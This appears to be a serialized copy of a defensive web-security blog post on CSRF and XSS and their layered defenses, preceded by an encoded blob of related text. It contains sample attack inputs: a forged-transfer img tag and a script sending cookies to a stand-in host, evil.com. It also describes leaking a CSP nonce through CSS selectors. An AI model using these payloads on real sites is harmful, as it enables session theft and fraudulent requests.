VzaApgYGAKCmBgYGpzCi8vIOiDjOaZr+abtOaWsCB0b2tlbu+8jOeAj+imveWZqOacg+iHquW3seW4tuS4iiByZWZyZXNoIGNvb2tpZQpjb25zdCByZXMgPSBhd2FpdCBmZXRjaCgnL2F1dGgvcmVmcmVzaCcsIHsgY3JlZGVudGlhbHM6ICdpbmNsdWRlJyB9KQphY2Nlc3NUb2tlbiA9IChhd2FpdCByZXMuanNvbigpKS5hY2Nlc3NUb2tlbgpgYGAKClhTUyDoroDkuI3liLAgcmVmcmVzaCB0b2tlbu+8jOS9huS4iumdoumAmeWFqeihjOWug+S5n+iDveeFp+i3keOAguWvpua4rOaZgu+8jOmggemdouS4iueahOS4gOautSBzY3JpcHQg5ZG85Y+r5LqG5LiJ5qyhIGAvYXV0aC9yZWZyZXNoYO+8jOeAj+imveWZqOavj+asoemDveiHquWLleW4tuS4iiByZWZyZXNoIGNvb2tpZe+8jHNjcmlwdCDkuZ/mr4/mrKHpg73oroDliLDmlrDnmoQgYWNjZXNzIHRva2Vu77yM5YWp5YCL54CP6Ka95Zmo6YO95LiA5qij44CC5YmN6Z2iIGBIdHRwT25seWAg6YKj56+A5Lmf5piv6YCZ5qij77yMY29va2llIOeahOWAvOiugOS4jeWIsO+8jHJlcXVlc3Qg54Wn5qij5bi26JGX5a6D5Ye65Y6744CC5omA5Lul5Y+q6KaB5YiG6aCB6ZaL6JGX77yMcGF5bG9hZCDmr4/lub7liIbpkJjlsLHog73mi7/kuIDlgIvmlrDnmoQgdG9rZW4g5YKz5Ye65Y6744CC5YiG6aCB6Zec5o6J5Lul5b6MIHBheWxvYWQg5bCx5YGc5LqG77yM5pyA5b6M5YKz5Ye65Y6755qE6YKj5YCLIGFjY2VzcyB0b2tlbiDlub7liIbpkJjlhaflsLHpgY7mnJ/vvIxyZWZyZXNoIHRva2VuIOWJh+W+numgreWIsOWwvuaykumboumWi+mBjueAj+imveWZqOOAggoKcmVmcmVzaCBjb29raWUg5pyD6KKr6Ieq5YuV5bi25LiK77yM5omA5LulIGAvYXV0aC9yZWZyZXNoYCDoh6rlt7HlsLHmnIkgQ1NSRiDnmoTllY/poYzjgILlnKjpgJnlgIsgY29va2llIOS4iuiorSBgU2FtZVNpdGU9U3RyaWN0YO+8jOWFtuS7lue2suermeeZvOi1t+eahCByZXF1ZXN0IOWwseS4jeacg+W4tuWug++8m+S9huWFhOW8nyBzdWJkb21haW4g5bGs5pa85ZCM5LiA5YCLIHNpdGXvvIzpgoTmmK/mnIPluLbvvIzmiYDku6XpgJnlgIsgZW5kcG9pbnQg5Lmf6KaB5qqi5p+lIGBPcmlnaW5g44CCU3RyaWN0IOS4jeacg+aJk+aWt+ato+W4uOa1geeoi+OAguWvpua4rOaZgu+8jOS9v+eUqOiAheW+nuWIpeeahOe2suermem7numAo+e1kOmAsuS+hu+8jOmggemdouaOpeiRl+WRvOWPqyBgL2F1dGgvcmVmcmVzaGDvvIzpgJnlgIsgcmVxdWVzdCDmnInluLbkuIogYFN0cmljdGAg55qEIGNvb2tpZe+8jOWboOeCuuWug+aYr+W+nuS9oOiHquW3seeahOmggemdoueZvOWHuueahOOAgumAmeaoo+S4gOS+hu+8jENTUkYg6KaB6JmV55CG55qE56+E5ZyN5bCx5b6e5pW05YCLIGFwcCDnuK7liLDkuIDlgIsgZW5kcG9pbnTjgIIKCuacgOepqeeahCBKV1QgYXBwIOaYryBEIOWKoCBD77ya5LiN6K6TIFhTUyDpgLLkvobjgILokKzkuIDpgLLkvobkuobvvIzlj5flrrPogIXnmoTliIbpoIHplovokZflpJrkuYXvvIzlroPlsLHog73pgI/pgY4gYC9hdXRoL3JlZnJlc2hgIOaLv+aWsOeahCB0b2tlbiDmi7/lpJrkuYXjgILkuI3pgY7mnInkuoYgQ++8jOWIhumggemXnOaOieW5vuWIhumQmOW+jO+8jOWug+WCs+WHuuWOu+eahCB0b2tlbiDpg73mnIPlpLHmlYjjgILlj6ropoHpqZforYnos4foqIrmlL7lnKggaGVhZGVyIOijoe+8jOWwseS4jemcgOimgSBDU1JGIHRva2Vu77yM5Zug54K6IEpXVCDkuI3mnIPooqvoh6rli5XluLbkuIrjgILpgoTlnKjnlKggY29va2llIOmpl+itieeahOi3r+eUse+8jOWwseaYryBjb29raWUgYXBw77yM54WnIGNvb2tpZSBhcHAg55qE5pa55byP6Ziy44CCCgo8L2RldGFpbHM+CgotLS0KCiMjIOWPg+iAg+izh+aWmQoKLSBbT1dBU1AgWFNTIFByZXZlbnRpb24gQ2hlYXQgU2hlZXRdKGh0dHBzOi8vY2hlYXRzaGVldHNlcmllcy5vd2FzcC5vcmcvY2hlYXRzaGVldHMvQ3Jvc3NfU2l0ZV9TY3JpcHRpbmdfUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1sKQotIFtPV0FTUCBDU1JGIFByZXZlbnRpb24gQ2hlYXQgU2hlZXRdKGh0dHBzOi8vY2hlYXRzaGVldHNlcmllcy5vd2FzcC5vcmcvY2hlYXRzaGVldHMvQ3Jvc3MtU2l0ZV9SZXF1ZXN0X0ZvcmdlcnlfUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1sKQotIFtDb250ZW50IFNlY3VyaXR5IFBvbGljeSAoTUROKV0oaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSFRUUC9DU1ApCi0gW1NhbWVTaXRlIGNvb2tpZXMgZXhwbGFpbmVkICh3ZWIuZGV2KV0oaHR0cHM6Ly93ZWIuZGV2L2FydGljbGVzL3NhbWVzaXRlLWNvb2tpZXMtZXhwbGFpbmVkKQotIFtUcnVzdGVkIFR5cGVzICh3ZWIuZGV2KV0oaHR0cHM6Ly93ZWIuZGV2L2FydGljbGVzL3RydXN0ZWQtdHlwZXMpCi0gW0NvbnRlbnQgU2VjdXJpdHkgUG9saWN5IExldmVsIDMgKFczQyldKGh0dHBzOi8vdzNjLmdpdGh1Yi5pby93ZWJhcHBzZWMtY3NwLykKLSBbSFRNTCBTdGFuZGFyZDogbm9uY2UgYXR0cmlidXRlc10oaHR0cHM6Ly9odG1sLnNwZWMud2hhdHdnLm9yZy9tdWx0aXBhZ2UvdXJscy1hbmQtZmV0Y2hpbmcuaHRtbCNub25jZS1hdHRyaWJ1dGVzKQotIFtTYW1lU2l0ZSB1cGRhdGVzIChDaHJvbWl1bSldKGh0dHBzOi8vd3d3LmNocm9taXVtLm9yZy91cGRhdGVzL3NhbWUtc2l0ZS8pCg==17:Tb1e0,<p>You're logged into <code>bank.com</code>. In another tab you open <code>evil.com</code>. The page contains:</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="html" data-theme="github-dark github-light"><code data-language="html" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">img</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> src</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"https://bank.com/transfer?to=evil&#x26;amount=1000"</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span></code></pre></figure>
+<p>Your browser issues a request to <code>bank.com</code>. For years, browsers sent your <code>bank.com</code> session cookie along with any request to <code>bank.com</code>, whichever page started it. (A session cookie is the small value <code>bank.com</code> set when you logged in; the server reads it to know the request is yours.) The transfer goes through.</p>
+<p>That's CSRF, cross-site request forgery. You didn't click anything. The attacker borrowed your logged-in session by tricking your browser into making a request.</p>
+<p>Does that <code>&#x3C;img></code> still work today? Mostly not. Testing with a local HTTPS server playing <code>bank.test</code> and <code>evil.test</code>: Chrome for Testing 156 sent only a cookie marked <code>SameSite=None</code>: since Chrome 80 (rolled out during 2020), a cookie with no <code>SameSite</code> attribute is treated as <code>SameSite=Lax</code>, which keeps it off requests that another site's images start. Firefox 159 sent no cookie at all, because its Total Cookie Protection (on by default since June 2022) gives <code>bank.test</code> a separate, empty cookie jar when it is loaded inside <code>evil.test</code>. Safari has blocked cookies on cross-site requests like this one by default since 13.1 (March 2020, per WebKit).</p>
+<p>Swap the <code>&#x3C;img></code> for a form that submits a POST to <code>bank.test/transfer</code> by itself, and the cookie comes back in two cases. Firefox sent the cookie that had no <code>SameSite</code>, because Firefox does not default to <code>Lax</code>. Chrome sent it too, but only while the cookie was under two minutes old, a temporary exception Chrome calls "Lax + POST" (<a href="https://www.chromium.org/updates/same-site/">Chromium SameSite updates</a>). 130 seconds after login, it was no longer sent. Cookies marked <code>SameSite=Lax</code> or <code>Strict</code> were not sent in any of these cases. So CSRF is narrower than it was, but a cookie without <code>SameSite</code> is still exposed.</p>
+<hr>
+<p>Now a different scenario. You visit <code>forum.com</code> and read someone's comment. The comment contains:</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="html" data-theme="github-dark github-light"><code data-language="html" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">script</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">fetch</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'https://evil.com/steal?c='</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> +</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> document.cookie)&#x3C;/</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">script</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span></code></pre></figure>
+<p>If <code>forum.com</code> put the comment into the page as raw HTML without escaping it (turning <code>&#x3C;</code> into <code>&#x26;lt;</code> so it shows as text), the script runs inside <code>forum.com</code>'s origin. An origin is scheme + host + port, here <code>https://forum.com</code>; the browser keeps each origin's data apart, and code running in one origin can touch everything that origin owns. So the script gets the page's DOM, its cookies (unless they are marked <code>HttpOnly</code>), and its localStorage. The attacker reads your session.</p>
+<p>That's XSS, cross-site scripting. The attacker injected code that runs as if <code>forum.com</code> wrote it.</p>
+<hr>
+<p>Picture the site you're logged into as an apartment building. The server is the building manager, and you have a unit inside. Your browser is a courier who carries the key to your unit: the session cookie. Each request is an order slip. When the courier brings a slip into the building he shows the key, and the manager, seeing the key, does what the slip says.</p>
+<p>The two attackers stand in different places. The CSRF one is <strong>outside</strong>. He has no key, so he hands the courier a forged slip from another site's page; the courier shows your key anyway, and the manager carries it out. The XSS one gets his slips into <strong>your own page</strong>. When a site puts someone else's comment into your page as raw HTML, it has left a field in your order book for a stranger to fill in. Slips written from that field look like yours to the courier and to the manager, and the stranger can also read every page of your order book.</p>
+<hr>
+<h2>Two attacks, two threat models</h2>
+<p><strong>XSS</strong>: <mark>code I didn't write running in my origin.</mark> Attacker delivers payload via stored content (comments, profile fields), reflected URL parameters, or DOM manipulation. Once it runs, it has full origin privileges: read non-HttpOnly cookies, localStorage, page state. Issue requests as user. The trust it exploits is the page's trust in user-supplied content.</p>
+<p><strong>CSRF</strong>: <mark>my browser sending a request I didn't intend.</mark> Attacker controls a different origin, embeds something (image, form, fetch) that triggers a request to the target. Browser attaches the target's cookies automatically wherever the cookie's settings allow it, and the server can't tell from the cookie alone that you never meant to send the request. The trust it exploits is the browser's automatic cookie attachment.</p>
+<hr>
+<h2>Architecture decides the threat surface</h2>
+<p>How your app authenticates determines which threat dominates.</p>
+<p><strong>Cookie sessions</strong> (server sets a session cookie, browser sends it automatically on requests to that server):</p>
+<ul>
+<li>Vulnerable to CSRF. A request started by another site can carry your cookie, unless <code>SameSite</code> (below) stops it.</li>
+<li>XSS still dangerous. Reads non-HttpOnly cookies, issues same-origin requests with full session.</li>
+</ul>
+<p><strong>Token auth</strong> (a JWT, JSON Web Token, or similar string that your own JavaScript puts in the <code>Authorization</code> header of each request):</p>
+<ul>
+<li>CSRF largely goes away. No cookie auto-attaches, so a forged request lacks credentials.</li>
+<li>XSS becomes the main threat. If the token sits in <code>localStorage</code>, an XSS payload reads it and is now the user, on any device, until expiry.</li>
+</ul>
+<p>Modern SPAs often use tokens. Apps rendered on the server usually use cookies.</p>
+<hr>
+<h2>XSS defenses, layered</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Layer</th><th>Who</th><th>What</th></tr></thead><tbody><tr><td>Output encoding</td><td>Client</td><td>Use the framework's interpolation (<code>{value}</code>). Stop reaching for <code>innerHTML</code> / <code>dangerouslySetInnerHTML</code> / <code>v-html</code>.</td></tr><tr><td>Sanitization</td><td>Client</td><td>When you must render user HTML, run it through DOMPurify, which strips scripts and event handlers. Don't roll your own.</td></tr><tr><td>Content Security Policy</td><td>Server</td><td><code>script-src 'self' 'nonce-RANDOM'</code>. A response header listing which scripts may run. Anything that doesn't fit gets rejected by the browser.</td></tr><tr><td>HttpOnly cookies</td><td>Server</td><td><code>Set-Cookie: ...; HttpOnly</code>. JS can't read it, but requests XSS sends still carry it; see "HttpOnly limits damage, it doesn't stop XSS" below.</td></tr><tr><td>Stored content sanitization</td><td>Server</td><td>Clean on input. Clean on output too, in case something got stored before the input check existed.</td></tr><tr><td><code>X-Content-Type-Options</code></td><td>Server</td><td><code>nosniff</code>. Browser stops guessing what a file is from its bytes, so a stored file served without a type isn't guessed into a page, and a file without a JavaScript type can't be loaded as a script.</td></tr><tr><td>Trusted Types</td><td>Client + Server</td><td>CSP directive (<code>require-trusted-types-for 'script'</code>). Assigning a plain string to a sink such as <code>innerHTML</code> throws. A policy is a function you register, e.g. <code>trustedTypes.createPolicy('app', { createHTML: s => DOMPurify.sanitize(s) })</code>; calling <code>policy.createHTML(str)</code> wraps the function's return value in a <code>TrustedHTML</code> object, and the sink accepts only such objects. A policy written as <code>s => s</code> lets any string through unchanged.</td></tr></tbody></table>
+<p>A sink is any API that turns a string into markup or code: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>. The first two rows handle most of the job, and the rest are there as extra safety nets.</p>
+<p>Trusted Types catch the bug when the line runs, not at build time. Chrome for Testing 156 threw <code>TypeError: ... This document requires 'TrustedHTML' assignment</code>, Firefox 159 threw <code>Sink type mismatch violation blocked by CSP</code>. Tests that reach that line will see the error. Support: Chrome 83, Firefox 148, Safari 26.</p>
+<p>CSP's nonce is a random value used once. With <code>script-src 'self' 'nonce-abc123'</code>, the server stamps every legitimate <code>&#x3C;script></code> tag with <code>nonce="abc123"</code>, and the browser executes only the inline tags carrying it (plus script files from your own origin, which is what <code>'self'</code> allows). Injected scripts don't have it, and the server picks a new nonce for every response, so one seen on an old page is useless on the next.</p>
+<details>
+<summary>Deeper: why XSS can't fake the nonce</summary>
+<p>If the attacker can only inject markup, such as a comment, he has to write the nonce into his own <code>&#x3C;script></code> before the page is sent. But the server generates a new nonce for every response, so he can't know it in advance.</p>
+<p>What about reading it off the page? When CSP comes in a response header, the browser empties every <code>nonce</code> attribute, and only scripts already running can read the original value from the <code>.nonce</code> property:</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">document.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">querySelector</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'script'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">getAttribute</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'nonce'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">)  </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// ""</span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">document.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">querySelector</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'script'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).nonce  </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// "abc123"</span></span></code></pre></figure>
+<p>The attribute is emptied so injected CSS can't read the nonce. The attacker's CSS could write one rule per possible character, <code>script[nonce^="a"]</code>, <code>script[nonce^="b"]</code>, and so on, each loading a background image from a different URL. Whichever character the nonce starts with, that rule matches, and the attacker's server receives the request for that image. As long as the page isn't reloaded, the nonce stays the same. The injected CSS uses <code>@import</code> to ask the attacker's server for the next stylesheet, and the server holds the response until the image request reveals the first character, then answers with rules for the second character, such as <code>script[nonce^="ab"]</code>. Repeating this spells out the whole nonce. With the attribute emptied, none of these rules match. Chrome for Testing 156 and Firefox 159 both empty it. If the CSP is sent in a <code>&#x3C;meta></code> tag instead, the attribute stays, and the trick can still work.</p>
+<p>If the nonce is hard-coded or the random value is too short, the attacker may guess it.</p>
+<p>Without <code>'unsafe-eval'</code>, CSP blocks <code>eval</code>. With it, if a script already on the page passes a URL parameter to <code>eval</code>, the attacker only has to put his code in that parameter and get the user to open the URL, and his code runs.</p>
+<p>With <code>'strict-dynamic'</code>, a script that has the nonce can load other scripts, and those run without a nonce. So if one of them is a loader that loads scripts based on a URL parameter, the attacker can load his own code through it. <code>'unsafe-inline'</code> next to a nonce is harmless, though: when a nonce is present, the browser ignores <code>'unsafe-inline'</code>.</p>
+</details>
+<details>
+<summary>Deeper: nosniff is a serve-back decision, not an upload one</summary>
+<p><code>X-Content-Type-Options</code> and the <code>Content-Type</code> it protects are both set by your server when it sends a stored file back, not when the file is uploaded. They are two separate trips:</p>
+<ul>
+<li><strong>Upload</strong> (a user sends you a file). The <code>Content-Type</code> on that request is whatever the uploader chose, so it is attacker-controlled. Don't store it and reuse it later.</li>
+<li><strong>Serve-back</strong> (your server returns the file to a viewer). Here your server sets the <code>Content-Type</code> itself, normally from the file extension (<code>.png</code> becomes <code>image/png</code>), and adds <code>nosniff</code>. This response is where the decision happens.</li>
+</ul>
+<p><code>nosniff</code> tells the viewer's browser to trust the <code>Content-Type</code> from the serve-back and never re-guess it from the bytes. So it only protects you if that <code>Content-Type</code> is correct. Serve it as <code>text/html</code> because you copied the uploader's value, and <code>nosniff</code> will trust that and render a page. The header only enforces your label, so the label has to be right first.</p>
+<p>Where does the guessing actually happen? Tested on Chrome for Testing 156 and Firefox 159: one stored file whose bytes are an HTML page with a <code>&#x3C;script></code>, served under different labels, opened directly in the tab.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><code>Content-Type</code> sent</th><th>without <code>nosniff</code></th><th>with <code>nosniff</code></th></tr></thead><tbody><tr><td>none</td><td>script ran (browser guessed HTML)</td><td>did not run</td></tr><tr><td><code>text/plain</code></td><td>did not run</td><td>did not run</td></tr><tr><td><code>image/png</code></td><td>did not run</td><td>did not run</td></tr><tr><td><code>text/html</code></td><td>ran</td><td>ran</td></tr></tbody></table>
+<p>A correct <code>image/png</code> label was already enough; neither browser turned an image label into a page. <code>nosniff</code> matters when the label is missing. It matters more for the second way to run a file: a <code>&#x3C;script src="/uploads/x.txt"></code> tag. <code>script-src 'self'</code> allows any file from your own origin, uploads included. A stored file whose bytes are JavaScript, loaded that way:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><code>Content-Type</code> sent</th><th>without <code>nosniff</code></th><th>with <code>nosniff</code></th></tr></thead><tbody><tr><td>none, <code>text/plain</code>, <code>text/html</code>, <code>application/octet-stream</code></td><td>ran as script</td><td>blocked</td></tr><tr><td><code>image/png</code></td><td>blocked</td><td>blocked</td></tr></tbody></table>
+<p>With <code>nosniff</code>, both browsers refused to run a script file under every non-JavaScript label tested, so an upload served under its real type can't pass for one of your scripts.</p>
+<p>The victim is a third party: an attacker uploads a file with a script inside, your server stores it, and a different user opens its URL. Loaded through <code>&#x3C;img></code>, the same file only ever decodes as image bytes and never runs.</p>
+</details>
+<h3>Important: HttpOnly limits the damage, does not prevent XSS</h3>
+<p><strong><code>HttpOnly</code> stops XSS from reading the cookie value. It does not stop XSS from using the session.</strong> XSS can still run <code>fetch('/transfer', ...)</code> from inside the origin, and the browser auto-attaches the HttpOnly cookie. The server authenticates the request normally. On Chrome for Testing 156 and Firefox 159, <code>document.cookie</code> listed every cookie except the <code>HttpOnly</code> one, and a same-origin <code>fetch</code> POST still carried it.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Capability</th><th>Without <code>HttpOnly</code></th><th>With <code>HttpOnly</code></th></tr></thead><tbody><tr><td>XSS reads <code>document.cookie</code></td><td>✅</td><td>❌</td></tr><tr><td>XSS exfiltrates cookie to attacker server</td><td>✅</td><td>❌</td></tr><tr><td>XSS issues authenticated requests in victim's browser</td><td>✅</td><td>✅</td></tr><tr><td>Attack persists after victim closes the tab</td><td>✅</td><td>❌</td></tr><tr><td>Cookie replayed from a different device</td><td>✅</td><td>❌</td></tr></tbody></table>
+<p>Rows two and three both look like XSS sending a request, but they end differently, because the browser only attaches a cookie to requests going to the site that set it. A request from XSS to <code>evil.com</code> carries <code>evil.com</code>'s cookies, not <code>bank.com</code>'s. So to hand the session to the attacker, the script first has to read the value from <code>document.cookie</code> and put it in a URL or a body. With <code>HttpOnly</code>, the cookie isn't in <code>document.cookie</code>, so the script can't read the value and has nothing to send. Requests XSS sends to <code>bank.com</code> do carry the cookie, but its value stays inside the browser; the attacker never gets it and can only borrow the session while the tab is open.</p>
+<p>Set <code>HttpOnly</code> anyway. Without it, the attacker walks away with a cookie that works from his own machine until the server ends the session. With it, he can only act through the victim's open tab, while it stays open. But don't treat it as the XSS defense. The actual XSS defense is output encoding + CSP.</p>
+<details>
+<summary>Deeper: in-memory tokens are still XSS-readable</summary>
+<p>Putting a JWT or access token in memory (Zustand, React context, plain module variable) is <strong>better than <code>localStorage</code>, not safe from XSS</strong>. XSS runs in your origin. Any JS-reachable state is reachable:</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// XSS payload, knowing the store</span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">useAuthStore.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">getState</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">().token</span></span>
+<span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// or walking the React fiber tree from a DOM node to component state</span></span></code></pre></figure>
+<p>The advantages over <code>localStorage</code> are real but they're about limiting the damage, not invisibility:</p>
+<ul>
+<li><strong>Harder for a generic XSS payload.</strong> <code>localStorage.getItem('token')</code> works the same on every site. Reading a Zustand store needs a reference to that app's store, which differs per app, so a payload written for many sites at once finds <code>localStorage</code> tokens easily and in-memory ones only with app-specific work.</li>
+<li><strong>When the tab closes, the token goes with it.</strong> A payload has to run while the token is in memory. A <code>localStorage</code> token sits on disk across reloads and restarts, so any XSS that runs later, even days later, still finds it.</li>
+</ul>
+<p>This is weaker than <code>HttpOnly</code>. An <code>HttpOnly</code> cookie can't be read at all, but an in-memory token that a payload does read can be sent to the attacker's server and replayed from any device until it expires. What limits that is the token's lifetime. Hence short-lived access tokens (5-15 min) with the long-lived refresh token in an HttpOnly cookie: a stolen access token works for minutes, not days. But while the payload runs, it can call <code>/auth/refresh</code> itself, the browser attaches the refresh cookie, and each call returns a new access token it can send out. Only after the payload stops does the last token it sent out run down its few minutes. Once the victim closes the tab, the attacker can't get new access tokens. The refresh token is in an HttpOnly cookie, so he can't read it and can only call <code>/auth/refresh</code> through the victim's open tab. If instead the refresh token sits where JS can read it, the attacker can steal it and keep minting access tokens until the refresh token itself expires, whether or not the victim's tab is still open.</p>
+</details>
+<hr>
+<h2>CSRF defenses, layered</h2>
+<p><strong>Read this whole table assuming XSS is already prevented.</strong> Almost every CSRF defense here stops working once an attacker has XSS, because XSS runs as your own origin and reads the token, the DOM, and the page state directly. The "Still works under XSS?" column makes that dependency visible.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Layer</th><th>Who</th><th>What</th><th>Still works under XSS?</th></tr></thead><tbody><tr><td><code>SameSite</code> cookie</td><td>Browser + Server</td><td><code>Set-Cookie: ...; SameSite=Lax</code>. The courier won't show your key on slips handed over from another site. The exception: you click a link on another site, the whole tab switches to your site, and the request is a GET. Blocks cross-site sub-resource requests and cross-site form POSTs. Chrome treats a cookie with no <code>SameSite</code> as <code>Lax</code> since Chrome 80 (2020); Firefox and Safari don't, so set it explicitly.</td><td>No. XSS runs same-site, cookie attaches normally.</td></tr><tr><td><code>SameSite=Strict</code></td><td>Server</td><td><code>Set-Cookie: ...; SameSite=Strict</code>. Even following a link from another site to yours skips the cookie on that first request. Use for admin / financial endpoints.</td><td>No. Same reason.</td></tr><tr><td>CSRF token</td><td>Client + Server</td><td>A code word printed only in your own order book. Server plants a random token in the form / response. State-changing requests must send it back. <code>evil.com</code> can't read your page, because the same-origin policy (SOP) stops one origin from reading another's responses, so it can't forge the token.</td><td>No. XSS reads it from the DOM and includes it.</td></tr><tr><td><code>Origin</code> / <code>Referer</code> check</td><td>Server</td><td>The slip says which site handed it over. Browsers add an <code>Origin</code> header to POST requests. If a request to your <code>/transfer</code> carries <code>Origin: https://evil.com</code>, reject it.</td><td>No. XSS requests carry your real <code>Origin</code>.</td></tr><tr><td>Verb discipline</td><td>Server</td><td>GET never changes state. Image tags can fire GET, not POST. Forces attackers to write more.</td><td>No. XSS does any verb.</td></tr><tr><td>Skip cookies</td><td>Architecture</td><td>JWT in <code>Authorization</code> header. No auto-attach, no CSRF surface.</td><td>No, worse. <code>localStorage</code> JWT is one line away from XSS.</td></tr><tr><td>Re-auth / MFA on sensitive ops</td><td>Server + Client + User</td><td>The manager phones you before opening the safe. Re-enter password, type an authenticator code (TOTP), or tap a security key (WebAuthn) before high-impact actions.</td><td><strong>Partly.</strong> XSS can't supply your password or tap your key by itself. But it controls the page, so it can show a real-looking prompt and wait for you to fill it in. It now needs your cooperation, so it can no longer act silently.</td></tr></tbody></table>
+<hr>
+<h2>Why XSS dominates</h2>
+<p>The table above already showed why: under XSS every standard CSRF layer stops working. OWASP's CSRF cheat sheet says it in one line: "Cross-Site Scripting (XSS) can defeat all CSRF mitigation techniques!" Re-auth is the one layer that still slows XSS down, because XSS doesn't have your password or your key and has to get you to hand them over.</p>
+<p>Practical priority:</p>
+<ol>
+<li><strong>Stop XSS first.</strong> Framework auto-escape + CSP + sanitize stored input + nosniff, with <code>HttpOnly</code> capping the damage.</li>
+<li><strong>Then layer CSRF defenses on top.</strong> SameSite + token + Origin check. These add value only when XSS is already prevented.</li>
+<li><strong>For high-stakes operations, add re-auth or MFA.</strong> It still means something after a successful XSS: the attacker has to trick you into confirming, instead of acting alone.</li>
+</ol>
+<hr>
+<h2>What I'd do today</h2>
+<p>Same defenses, assembled per architecture. Each ladder starts from the naive version and adds one layer at a time.</p>
+<details>
+<summary>Harden a cookie-session app, step by step</summary>
+<p>The three anti-XSS pieces come first; call them the foundation: CSP nonce, framework auto-escape, and nosniff. Once XSS gets in, SameSite, the CSRF token, and the Origin check stop working, and <code>HttpOnly</code> only limits the damage.</p>
+<p>To harden an existing app, follow steps 0 to 6 below in order. CSP nonce means changing every template and auditing every third-party script, the most work of any step, so it sits at step 4 and the cheap steps go first. The table lists each layer's cost and defense value:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Layer</th><th>Cost</th><th>Value</th></tr></thead><tbody><tr><td><code>HttpOnly</code> + <code>Secure</code></td><td>one line each</td><td>caps damage, does not stop the attack</td></tr><tr><td><code>nosniff</code></td><td>one line</td><td>closes one XSS path: an uploaded file loaded with <code>&#x3C;script src></code> while served under a non-JavaScript type no longer runs. XSS that gets in any other way is unaffected</td></tr><tr><td><code>SameSite</code></td><td>one line</td><td>stops classic CSRF from other sites, nothing from your own subdomains, nothing else</td></tr><tr><td>CSRF token</td><td>wire every form</td><td>stops working once XSS gets in</td></tr><tr><td>CSP nonce</td><td>real project work: the server generates a nonce per request, every template injects it, every third-party script gets audited. Miss one and the page breaks</td><td>highest value in the stack. It stops injected script before it runs, and XSS is the attack that gets past every other layer</td></tr></tbody></table>
+<p>An existing app goes in this order so hardening doesn't break it. The expensive, high-value CSP waits until you can schedule it.</p>
+<p><strong>0. Bare cookie.</strong> Everything is exposed: XSS can read it, CSRF can use it, and it travels in plaintext.</p>
+<pre><code>Set-Cookie: session=abc123
+</code></pre>
